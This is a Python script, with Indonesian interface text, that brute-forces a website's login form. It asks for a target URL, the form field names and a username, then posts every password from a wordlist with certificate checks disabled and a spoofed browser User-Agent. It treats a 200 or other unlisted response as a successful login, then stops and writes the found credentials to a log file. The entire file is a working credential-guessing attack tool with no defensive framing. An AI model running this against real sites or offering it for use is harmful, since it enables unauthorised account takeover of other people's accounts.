import os
import time
import datetime
import requests
import urllib3
import datetime
from colorama import Fore, Back, Style, init

init()

Tanggal = datetime.datetime.now()
file_name = Tanggal.strftime("%d%b%Y_%H%M%S")  

def bruteV2():
    localtime = time.time()

    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}

    link_target = input(str(Fore.YELLOW +"Masukan Link Target Form Login : "+ Style.RESET_ALL))
    Parameter1 = input(str(Fore.YELLOW +"Masukan Parameter user         : "+ Style.RESET_ALL))
    Parameter2 = input(str(Fore.YELLOW +"Masukan Parameter pass         : "+ Style.RESET_ALL))
    username = input(str(Fore.YELLOW +"Username / Email               : "+ Style.RESET_ALL))
    print("\n########### Login Mass Berjalan ###########")
    with open ("./wordlist/password.txt", "r", encoding='utf8', errors='ignore') as myFile:
        data = myFile.readlines()

    cound = True
    s=0
    while cound:
        try:
            m=1
            password = data[s].rstrip('\n')
            s=s+m
            data_dict = {Parameter1:username,Parameter2:password}
            urllib3.disable_warnings()
            req = requests.post(link_target, headers=headers, timeout=100, data=data_dict, verify=False)
            if('Password yang anda masukan salah' in str(req.content) or 'Email' in str(req.content) or 'Password yang anda masukan salah' in str(req.content) or 'Username atau Password Salah' in str(req.content) or 'Username Salah' in str(req.content) or 'Password Salah' in str(req.content) or 'Username Belum Terdaftar' in str(req.content)):
                print(Fore.GREEN +"[INFO]", Style.RESET_ALL,Fore.YELLOW + "Website :", Style.RESET_ALL,req.url,Fore.YELLOW +"Username : ", Style.RESET_ALL,username,Fore.YELLOW +"Password : ", Style.RESET_ALL,password,Fore.RED + "Login Gagal" + Style.RESET_ALL)
            elif(req.status_code == 302):
                print(Fore.GREEN +"[INFO]", Style.RESET_ALL,Fore.YELLOW + "Website :", Style.RESET_ALL,req.url,Fore.YELLOW +"Username : ", Style.RESET_ALL,username,Fore.YELLOW +"Password : ", Style.RESET_ALL,password,Fore.RED + "Login Gagal" + Style.RESET_ALL)
            elif(req.status_code == 401):
                print(Fore.GREEN +"[INFO]", Style.RESET_ALL,Fore.YELLOW + "Website :", Style.RESET_ALL,req.url,Fore.YELLOW +"Username : ", Style.RESET_ALL,username,Fore.YELLOW +"Password : ", Style.RESET_ALL,password,Fore.RED + "Login Gagal" + Style.RESET_ALL)
            elif(req.status_code == 400):
                print(Fore.GREEN +"[INFO]", Style.RESET_ALL,Fore.YELLOW + "Website :", Style.RESET_ALL,req.url,Fore.YELLOW +"Username : ", Style.RESET_ALL,username,Fore.YELLOW +"Password : ", Style.RESET_ALL,password,Fore.RED + "Login Gagal" + Style.RESET_ALL)
            elif(req.status_code == 200):
                print(Fore.GREEN +"[SUCCESS]", Style.RESET_ALL,Fore.YELLOW + "Website :", Style.RESET_ALL,req.url,Fore.YELLOW +"Username : ", Style.RESET_ALL,username,Fore.YELLOW +"Password : ", Style.RESET_ALL,password,Fore.GREEN + "Login Berhasil" + Style.RESET_ALL)
                break
            else:
                print(Fore.GREEN +"[SUCCESS]", Style.RESET_ALL,Fore.YELLOW + "Website :", Style.RESET_ALL,req.url,Fore.YELLOW +"Username : ", Style.RESET_ALL,username,Fore.YELLOW +"Password : ", Style.RESET_ALL,password,Fore.GREEN + "Login Berhasil" + Style.RESET_ALL)
                link = req.url
                simpan_log = "Username {} Password {} Website {} Status {}\n".format(username,password,link,req.status_code)
                log = open("./log/brutev2/{}.txt".format(file_name),"a")
                log.write(str(simpan_log))
                print(Fore.YELLOW +'Log di simpan di directory : /log/brutev2/{}.txt'.format(file_name), Style.RESET_ALL)
                break
        except requests.exceptions.RequestException as e:
            print(e)